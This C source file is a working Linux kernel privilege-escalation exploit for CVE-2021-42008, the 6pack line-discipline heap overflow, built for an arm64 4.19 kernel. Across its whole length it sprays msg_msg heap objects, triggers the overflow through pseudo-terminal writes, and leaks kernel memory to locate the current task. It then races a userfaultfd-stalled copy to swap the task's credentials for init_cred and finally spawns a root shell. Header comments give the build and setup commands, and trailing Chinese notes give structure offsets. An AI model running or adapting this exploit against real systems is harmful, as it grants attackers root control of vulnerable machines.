// Exploit is designed and tested for Ubuntu 18.04, kernel 4.19.35-arm64
// gcc -o cve-2021-42008 cve-2021-42008.c -s -lpthread
// sudo setcap cap_net_admin=eip cve-2021-42008
// docker run --cap-add=NET_ADMIN --security-opt seccomp=unconfined --rm -it --name ubuntu-test ubuntu-cve-fe0 bash

#define _GNU_SOURCE

#include <endian.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pwd.h>
#include <sys/mman.h>
#include <unistd.h>
#include <poll.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sched.h>
#include <stdbool.h>
#include <assert.h>
#include <sys/capability.h>

// #define DEBUG 1
#ifdef DEBUG
#define debug_printf(...) printf(__VA_ARGS__)
#else
#define debug_printf(...) do {} while (0)
#endif

#define N_6PACK 7
#define PAGE_SIZE 0x1000
#define LEAK_PAYLOAD_SIZE 576
#define WRITE_PAYLOAD_SIZE 592
#define N_THREADS 8
#define N_MSG 0x100
#define RECV_MSG_LEN 0x1300
#define N_SP 0x100
// ffff0000096f2180 D init_task
// ffff0000096ee0d8 D init_cred

#if 1
#define INIT_TASK_TASKS 0xffff0000096f24e0
#define INIT_TASK_CREDS 0xffff0000096f2778
#define INIT_CRED       0xffff0000096fe0d8
#else
#define INIT_TASK_TASKS 0xffff0000096e24e0
#define INIT_TASK_CREDS 0xffff0000096e2778
#define INIT_CRED       0xffff0000096ee0d8
#endif

static int ufd_qid;
static int qid_A[N_MSG]     = {0};
static int qid_B[N_MSG]     = {0};
static pthread_t tid[20]    = {0};
static int shmid[0x100]     = {0};
static void *shmaddr[0x100] = {0};
static int ufd[10]          = {0};
static void *pages[] = {
    (void *)0x1110000, (void *)0x2220000,
    (void *)0x3330000, (void *)0x4440000,
    (void *)0x5550000, (void *)0x6660000,
    (void *)0x7770000, (void *)0x8880000
};

uint8_t buff[PAGE_SIZE]  = {0};
uint8_t buff2[PAGE_SIZE] = {0};

uint64_t init_ipc_ns   = 0;
uint64_t modprobe_path = 0;
uint64_t leaked_queue  = 0;
int valid_qid = -1;
bool release_pfh = false;

struct pfh_args
{
    int id;
    int ufd;
    void *page;
};

struct t_args
{
    int id;
    int qid;
    void *page;
};

static int ptmx_A[N_MSG]     = {0};
static int pts_A[N_MSG]     = {0};

uint64_t target_addr;
uint64_t race_page;
uint64_t init_cred = INIT_CRED;
pthread_t thread;

int ptmx, pts;


typedef struct 
{
        long mtype;
        char mtext[1];
}msg;

void __pause(char *msg)
{
    printf("[-] Paused - %s\n", msg);
    getchar();
}

void waitfor(int n, char *msg)
{
    char *symbols[] = { "\\", "|" , "/", "-", NULL };

    for (int i = 0; i < n; i++)
    {
        printf("\r[%s] %s", symbols[i % 4], msg);
        fflush(stdout);
        sleep(1);
    }

    puts("\r[+] Timer should be expired           ");
    fflush(stdout);
}

void errExit(char* msg1)
{
    puts(msg1);
    exit(-1);
}

void hexdump(uint8_t *buff, size_t size)
{
    int i,j;
    for (i = 0; i < size/8; i++)
    {
        if ((i % 2) == 0)
        {
            if (i != 0)
                printf("  \n");
            printf("  %04x  ", i*8);
        }
        printf("0x%016lx", ((uint64_t *)(buff))[i]);
        printf("    ");
    }
    putchar('\n');
}

void print_affinity()
{
    cpu_set_t mask;
    long ncpu, i;

    if (sched_getaffinity(getpid(), sizeof(cpu_set_t), &mask) < 0)
    {
        perror("[X] sched_getaffinity()");
        exit(1);
    }

    ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    puts("[*] CPU affinity:");

    for (i = 0; i < ncpu; i++)
        printf(" └ Core #%ld = %d\n", i, CPU_ISSET(i, &mask));
}

void assign_to_core(int core_id)
{
    /*
    if (unshare(CLONE_NEWUSER) < 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        return -1;
    }
    if (unshare(CLONE_NEWNET) < 0) {
        perror("[-] unshare(CLONE_NEWNET)");
        return -1;
    }*/
    cpu_set_t mask;
    pid_t pid;
    pid = getpid();

    printf("[*] Assigning process %d to core %d\n", pid, core_id);

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);
    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        perror("[X] sched_setaffinity()");
        exit(1);
    }
    print_affinity();
}


void alloc_msg_queue_A(int id)
{
    if ((qid_A[id] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror("[X] msgget");
        exit(1);
    }
}
// spray 6 msg_msg in kmalloc-4k and 6 msg_msgseg in kmalloc-32
void send_msg(int qid, int size, int type, int c)
{
    struct msgbuf
    {
        long mtype;
        char mtext[size];
    } msg;

    msg.mtype = type;
    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), 0) == -1)
    {
        perror("[X] msgsnd");
        exit(1);
    }
}

void *recv_msg(int qid, size_t size, int type)
{
    void *memdump = malloc(size);

    if (msgrcv(qid, memdump, size, type, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) < 0)
    {
        perror("[X] msgrcv");
        return NULL;
    }

    return memdump;
}

int open_ptmx(void)
{
    int ptmx;
    ptmx = getpt();

    if (ptmx < 0)
    {
        perror("[X] open_ptmx()");
        exit(1);
    }

    grantpt(ptmx);
    unlockpt(ptmx);

    return ptmx;
}

int open_pts(int fd)
{
    int pts;
    pts = open(ptsname(fd), 0, 0);

    if (pts < 0)
    {
        perror("[X] open_pts()");
        exit(1);
    }

    return pts;
}

void set_line_discipline(int fd, int ldisc)
{
    if (ioctl(fd, TIOCSETD, &ldisc) < 0)
    {
        perror("[X] ioctl() TIOCSETD");
        exit(1);
    }
}

uint8_t *sixpack_encode(uint8_t *src)
{
    uint8_t *dest = (uint8_t *)calloc(1, 0x3000);
    uint32_t raw_count = 2;

    for (int count = 0; count <= PAGE_SIZE; count++)
    {
        if ((count % 3) == 0)
        {
            dest[raw_count++] = (src[count] & 0x3f);
            dest[raw_count] = ((src[count] >> 2) & 0x30);
        }
        else if ((count % 3) == 1)
        {
            dest[raw_count++] |= (src[count] & 0x0f);
            dest[raw_count] =	((src[count] >> 2) & 0x3c);
        }
        else
        {
            dest[raw_count++] |= (src[count] & 0x03);
            dest[raw_count++] = (src[count] >> 2);
        }
    }

    return dest;
}
// generate_payload() —— construct payload and encode it
uint8_t *generate_payload(uint64_t target)
{
    uint8_t *encoded;
    memset(buff, 0, PAGE_SIZE);

    // sp->rx_count_cooked = 0x696
    buff[0x194] = 0x90;
    buff[0x19a] = 0x06;

    // fix upper two bytes of msg_msg.m_list.prev
    buff[0x19b] = 0xff;
    buff[0x19c] = 0xff;

    // // msg_msg.m_ts = 0x1100      0x19c + 0x8(long m_type) + 2 = 0x1a6
    buff[0x1a6] = 0x13;

    // msg_msg.next = target
    if (target)
    {
        for (int i = 0; i < sizeof(uint64_t); i++)
            buff[0x1ad + i] = (target >> (8 * i)) & 0xff;
    }

    encoded = sixpack_encode(buff);

    // sp->status = 0x18 (to reach decode_data())
    encoded[0] = 0x88;
    encoded[1] = 0x98;

    return encoded;
}

void close_queue(int qid)
{
    if (msgctl(qid, IPC_RMID, NULL) < 0)
    {
        perror("[X] msgctl()");
        exit(1);
    }
}
int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

int initialize_ufd(void *page)
{
    int fd;
    struct uffdio_register reg;

    if ((fd = userfaultfd(O_NONBLOCK)) == -1)
    {
        perror("[X] Userfaultfd failed");
        exit(1);
    }

    if ((ufd_qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror("[X] msgget");
        exit(1);
    }

    struct uffdio_api api = { .api = UFFD_API };
    if (ioctl(fd, UFFDIO_API, &api))
    {
        perror("[X] ioctl - UFFDIO_API failed");
        exit(1);
    }

    if (api.api != UFFD_API)
    {
        puts("[X] Unexpected UFFD api version!");
        exit(1);
    }

    debug_printf("[*] Start monitoring range: %p - %p\n", page + PAGE_SIZE, page + PAGE_SIZE*2);

    reg.mode = UFFDIO_REGISTER_MODE_MISSING;
    reg.range.start = (long)(page + PAGE_SIZE);
    reg.range.len = PAGE_SIZE;

    if (ioctl(fd, UFFDIO_REGISTER,  &reg))
    {
        perror("[X] ioctl - UFFDIO_REGISTER failed");
        exit(1);
    }

    return fd;
}
// page_fault_handler() —— copy fake modprobe_path string to faultpage
void *page_fault_handler(void *arg)
{
    struct pollfd pollfd;
    struct uffd_msg fault_msg;
    struct uffdio_copy ufd_copy;
    struct uffdio_range ufd_range;

    pid_t pid;
    int ufd = ((struct pfh_args *)arg)->ufd;
    int id = ((struct pfh_args *)arg)->id + 1;
    void *page = ((struct pfh_args *)arg)->page;

    pollfd.fd = ufd;
    pollfd.events = POLLIN;

    debug_printf("[PFH %d] Started!\n", id);

    while (poll(&pollfd, 1, -1) > 0)
    {
        if ((pollfd.revents & POLLERR) || (pollfd.revents & POLLHUP))
        {
            perror("[X] Polling failed");
            exit(1);
        }

        if (read(ufd, &fault_msg, sizeof(fault_msg)) != sizeof(fault_msg))
        {
            perror("[X] Read - fault_msg failed");
            exit(1);
        }

        char *page_fault_location = (char *)fault_msg.arg.pagefault.address;

        if (fault_msg.event != UFFD_EVENT_PAGEFAULT)
        {
            perror("[X] Unexpected pagefault?");
            exit(1);
        }

        if (page_fault_location == page + PAGE_SIZE)
        {
            debug_printf("[PFH %d] Page fault at 0x%lx\n", id, page_fault_location);

            for (;;)
            {
                if (!release_pfh)
                    continue;

                debug_printf("[PFH %d] Releasing faulting thread\n", id);

                ufd_copy.dst = (uint64_t)(page_fault_location);
                ufd_copy.src = (uint64_t)(&buff2);              // copy buff2 to the fault_page, buff2 contains fake modprobe_path string, to change modeprobe_path
                ufd_copy.len = PAGE_SIZE;
                ufd_copy.mode = 0;
                ufd_copy.copy = 0;

                if (ioctl(ufd, UFFDIO_COPY, &ufd_copy) < 0)
                {
                    perror("[X] ioctl(UFFDIO_COPY)");
                    exit(1);
                }
                break;
            }

            debug_printf("[PFH %d] Faulting thread released\n", id);
            break;
        }
    }
}
// create faultpage handler
void create_pfh_thread(int id, int ufd, void *page)
{
    struct pfh_args *args = (struct pfh_args *)malloc(sizeof(struct pfh_args));

    args->id = id;
    args->ufd = ufd;
    args->page = page;

    pthread_create(&tid[id], NULL, page_fault_handler, (void *)args);
}

void alloc_msg_queue_B(int id)
{
    if ((qid_B[id] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror("[X] msgget");
        exit(1);
    }
}

void *allocate_msg(void *arg)
{
    int id = ((struct t_args *)arg)->id;
    void *page = ((struct t_args *)arg)->page;

    debug_printf("[Thread %d] Message buffer allocated at 0x%lx\n", id + 1, page + PAGE_SIZE - 0x8);
    alloc_msg_queue_B(id);

    memset(page, 0, PAGE_SIZE);
    ((uint64_t *)(page))[0xff8 / 8] = 1; // msg_msg.m_type = 1

    if (msgsnd(qid_B[id], page + PAGE_SIZE - 0x8, 0xfe0, 0) < 0)
    {
        perror("[X] msgsnd");
        exit(1);
    }

    debug_printf("[Thread %d] Message sent!\n", id + 1);
}

// create_message_thread() —— spray 8 msg_msg and msg_msgseg, which hangs at copy_from_user(), to change modprobe_path
void create_message_thread(int id, void *page)
{
    struct t_args *args = (struct t_args *)malloc(sizeof(struct t_args));

    args->id = id;
    args->page = page;

    pthread_create(&tid[id + 2], NULL, allocate_msg, (void *)args);
}


int main()
{
    uint8_t *payload;
    int status = 0;
    char *mesg;
    int64_t prev, curr;
    int64_t real_cred, cred;
    char comm[16];

    assign_to_core(0);

    // struct __user_cap_header_struct cap_header_data;  
    // cap_user_header_t cap_header = &cap_header_data;  
  
    // struct __user_cap_data_struct cap_data_data;  
    // cap_user_data_t cap_data = &cap_data_data;  
  
    // cap_header->pid = getpid();  
    // cap_header->version = _LINUX_CAPABILITY_VERSION_1;  
  
    // if (capget(cap_header, cap_data) < 0) {  
    //     perror("Failed capget");  
    //     exit(1);  
    // }  
    // printf("Cap data effective 0x%x, permitted 0x%x, inheritable 0x%x\n", cap_data->effective,cap_data->permitted, cap_data->inheritable);  
  
// 0-2. prepare userfaultfd
    for (int i = 0; i < N_THREADS; i++)
    {
        mmap(pages[i], PAGE_SIZE*3, PROT_READ|PROT_WRITE,
            MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
        ufd[i] = initialize_ufd(pages[i]);
    }
// 0-3. prepare faultpage handler threads: copy fake modprobe_path string to faultpage
    for (int i = 0; i < N_THREADS; i++)
        create_pfh_thread(i, ufd[i], pages[i]);

// 1-2. spray 6 msg_msg in kmalloc-4k and 6 msg_msgseg in kmalloc-32
    puts("[*] Spraying messages in kmalloc-4k...");
    for (int i = 0; i < N_MSG; i++)
        alloc_msg_queue_A(i);

    // payload = generate_payload(INIT_TASK_TASKS - 0x8);
    // payload = generate_payload(INIT_TASK_CREDS - 0x8);
    
    for (int i = 0; i < N_MSG; i++){
        send_msg(qid_A[i], 0xfd0+0x18, 1, 'A');
        if(i % 2){
            mesg = (char *)recv_msg(qid_A[i], RECV_MSG_LEN, 0);
            if((mesg[0x10] & 0xff) != 'A'){
                printf("recv_msg ---------- i %#x mesg[0] %#x mesg[0x10] %#x\n", i, mesg[0], mesg[0x10]);
                ptmx = ptmx_A[(mesg[0x10] & 0xff)];
                valid_qid = i;
            }
        }
        ptmx_A[i] = open_ptmx();
        pts_A[i] = open_pts(ptmx_A[i]);

        set_line_discipline(pts_A[i], N_6PACK);

    }

    if(valid_qid != -1){
        prev = INIT_TASK_TASKS;
        while(memcmp(comm, "try_mknod", 9))
        // while(memcmp(comm, "cve-2021-42008", 14))
        {
            curr = prev - 0x360;
            payload = generate_payload(prev - 0x8);
            write(ptmx, payload, WRITE_PAYLOAD_SIZE);
            sleep(1);  
            mesg = (char *)recv_msg(qid_A[valid_qid], RECV_MSG_LEN, 0);
            memcpy((void *)&prev, (void *)(mesg + 0xfe0), 8);       
            memcpy(comm, (void *)(mesg + 0x1280), 16);
            printf("---- prev %#lx, comm %s ----- \n", prev, comm);
        }
        close_queue(qid_A[valid_qid]);
        // if ((qid_A[valid_qid] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
        // {
        //     perror("[X] msgget");
        //     exit(1);
        // }

        printf("[+] ptmx %d, found current task struct: 0x%lx\n", ptmx, curr);

        memset(buff2, 0x45, sizeof(buff2));
        memcpy((void *)(buff2 + 0xfd0), (void *)&init_cred, 8);              // msg_msg: 0xfd0  -  real_cred
        memcpy((void *)(buff2 + 0xfd0 + 8), (void *)&init_cred, 8);          // msg_msg: 0xfd8  -  cred
        
        for (int i = 0; i < N_THREADS; i++)
            create_message_thread(i, pages[i]);
    // 3-2. wait sixpack struct to be reset
        waitfor(6, "Waiting for resync_tnc callback...");
    // 3-3. trigger the vulnerability again to change msg_msg->next
        puts("[*] Overwriting cred pointer...");
        target_addr = curr + 0x5f8 - 0x8;           // 1 null qword beforehand to avoid crash

        payload = generate_payload(target_addr);

        write(ptmx, payload, WRITE_PAYLOAD_SIZE);
        
        sleep(1);
    // 3-4. open the barrier and change modprobe_path
        release_pfh = true;

        for (int i = 0; i < N_THREADS; i++)
            pthread_join(tid[i + 2], NULL);

        for (int i = 0; i < N_THREADS; i++)
            munmap(pages[i], PAGE_SIZE*3);

        release_pfh = false;
        // msg *rooter;
        // void *evil_page = mmap(NULL, 4*page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        // // memset(evil_page, 0x45, 0x2000);
        // race_page = (uint64_t)(evil_page + 0x1000);
        // rooter = (msg *)(race_page - 0x8);          // cause fault page at race_page
        // rooter->mtype = 1;
        // printf("[+] &race_page = %#lx\n", race_page);

        
        // register_userfault(race_page, 0x1000, thread);
        
        // msgsnd(qid_A[valid_qid], rooter, 0xfd0 + 0x10, 0);        // memory layout:   0xfd0 + 0x10  ->  kmalloc-4096 + kmalloc-32
        // pthread_join(thread, NULL);
        sleep(2);
        printf("uid: %d\n", getuid());
        system("/bin/sh");
        // munmap(evil_page, PAGE_SIZE*4);
    }
   
     
    

end:
    puts("[*] Cleaning up... ");

    for (int i = 0; i < N_MSG; i++)
    {
        if (i == valid_qid)
            continue;

        close_queue(qid_A[i]);
    }

    for (int i = 0; i < N_SP; i++){
        close(ptmx_A[i]);
        close(pts_A[i]);
    }
    return 0;
}

/*
(1) 查看结构 sixpack->cooked_buf 距离下一个chunk的距离
(1-1) 原环境
net_device size: 0x940  0x800
sixpack size: 0x270    0x268
sixpack->cooked_buf offset: 0x1000 - 0x940 - (0x696-8-6) = 0x38

sixpack->cooked_buf to msg_msg->m_list->prev: 0x696  0x7d6
msg_msg->m_list->prev 后两字节: 8+6

(1-2) 新环境
$ print sizeof(struct net_device)
$ p/x &(*(struct sixpack*)0)->cooked_buf


*/
